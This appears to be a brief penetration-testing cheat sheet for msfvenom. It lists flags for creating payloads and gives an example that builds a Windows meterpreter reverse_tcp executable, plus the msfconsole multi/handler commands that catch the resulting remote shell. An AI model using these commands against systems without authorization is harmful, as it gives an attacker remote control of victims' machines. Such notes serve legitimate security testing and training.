
Can be used to create/encode payloads to be executed on the target (must be first downloaded by the target).
Once payload executed by the target, can connect with `mfsconsole` -> `exploit/multi/.../handler` 


### Payload creation
- `-l payloads`: list all payloads
- `-p <payload>`: create payload
- `--help-formats`: list all available formats
- `-f <format>`: specify the format

### Example

`msfvenom -p windows/meterpreter/reverse_tcp lhost=<my-host> lport=<my-port> -f exe > payload.exe`

[msfconsole]
`use exploit/multi/handler`
`set payload windows/meterpreter/reverse_tcp`
`set lhost <my-host>; set lport <my-port>`
